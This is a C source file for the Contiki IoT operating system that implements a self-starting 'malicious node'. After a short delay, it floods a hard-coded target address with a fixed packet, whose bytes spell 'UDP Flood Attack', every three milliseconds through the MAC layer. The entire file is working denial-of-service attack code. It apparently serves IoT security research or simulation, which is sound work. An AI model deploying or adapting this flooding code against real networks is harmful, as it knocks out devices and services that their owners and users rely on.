
/**
 * @file malnodemac.c
 * @author Ghozlan
 * @brief 
 * @version 0.1
 * @date 2021-05-27
 * 
 * @copyright Copyright (c) 2021
 * 
 */
#include "contiki.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include <stdio.h>
#include <string.h>
#include "sys/log.h"

/**
 * @brief Logging macros
 * 
 */
#define LOG_MODULE "malNodeMAC"
#define LOG_LEVEL LOG_LEVEL_INFO

/**
 * @brief Server configuration macros
 * 
 */
#define SEND_INTERVAL (0.003 * CLOCK_SECOND)

/**
 * @brief Address of main node
 * 
 */

static linkaddr_t dstAddr = {{0x00, 0x12, 0x74, 0x01, 0x00, 0x01, 0x01, 0x01}}; 

PROCESS(mal_node_mac_proc, "Malicious Node (MAC)");
AUTOSTART_PROCESSES(&mal_node_mac_proc);

/**
 * @brief Construct a new process thread object
 * 
 */
PROCESS_THREAD(mal_node_mac_proc, ev, data)
{
    static struct etimer timer;
    static char data_[] = {0x7E, 0xF7, 0x00, 0xE1 , 0x06, 0x63, 0x04, 
    0x00, 0x00, 0x01, 0x00, 0xF0, 0x22, 0x3D, 0x00, 0x05, 0x1A, 0xA8, 
    0x55, 0x44, 0x50, 0x20, 0x46, 0x6C, 0x6F, 0x6F, 0x64, 0x20, 0x41, 
    0x74, 0x74, 0x61, 0x63, 0x6B};

    int16_t len = sizeof(data_);

    PROCESS_BEGIN();

    etimer_set(&timer, 3 * 3 * CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    if (!linkaddr_cmp(&dstAddr, &linkaddr_node_addr))
    {
        etimer_set(&timer, SEND_INTERVAL);
        while (1)
        {
            PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
            packetbuf_clear();
            packetbuf_copyfrom(data_, len);
            packetbuf_set_addr(PACKETBUF_ADDR_RECEIVER, &dstAddr);
            packetbuf_set_addr(PACKETBUF_ADDR_SENDER, &linkaddr_node_addr);
            LOG_INFO("[*] Flooding... (UDP)\n");
            NETSTACK_MAC.send(NULL, NULL);
            etimer_reset(&timer);
        }
    }
    PROCESS_END();
}